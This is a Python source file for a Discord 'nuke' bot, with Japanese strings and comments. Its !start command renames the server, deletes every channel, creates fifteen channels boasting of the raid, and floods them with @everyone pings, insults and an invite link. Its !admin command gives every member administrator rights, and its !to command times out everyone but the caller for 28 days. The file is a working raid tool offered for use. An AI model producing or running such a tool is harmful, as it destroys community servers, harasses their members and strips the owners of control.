import discord
from discord.ext import commands
import os
import asyncio
import random

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
CHANNEL_COUNT = 15
MESSAGE_LOOPS = 80

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)


def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(30, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"


@bot.command()
async def start(ctx):
    guild = ctx.guild

    # ① サーバー名変更
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass

    # ② 全チャンネル削除 → 並列実行
    tasks = []
    for ch in list(guild.channels):
        tasks.append(ch.delete())
    await asyncio.gather(*tasks, return_exceptions=True)

    # ③ 新規チャンネル作成 → 並列で一気に作成
    tasks = []
    for i in range(CHANNEL_COUNT):
        tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}"))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    new_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]

    # ④ ラウンドロビン送信 → 1周ごと全チャンネル並列
    for _ in range(MESSAGE_LOOPS):
        text = random_mentions(guild) + COMBINED_TEXT
        tasks = [ch.send(text) for ch in new_channels]
        await asyncio.gather(*tasks, return_exceptions=True)


@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
        except:
            return

    tasks = []
    for m in guild.members:
        if not m.bot and admin_role not in m.roles:
            tasks.append(m.add_roles(admin_role))
    await asyncio.gather(*tasks, return_exceptions=True)


# ==============================================
# ✅ 新コマンド: !to → 自分以外全員をタイムアウト
# ==============================================
@bot.command(name="to")
async def timeout_all(ctx):
    guild = ctx.guild
    author = ctx.author
    duration = discord.utils.utcnow() + asyncio.timeouts.timedelta(days=28)  # 最長28日間

    tasks = []
    for member in guild.members:
        if member.bot or member.id == author.id:
            continue  # Botと実行者本人はスキップ
        try:
            tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
        except:
            pass

    await asyncio.gather(*tasks, return_exceptions=True)


@bot.event
async def on_ready():
    print(f"起動: {bot.user}")


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークンを設定してください")

bot.run(TOKEN)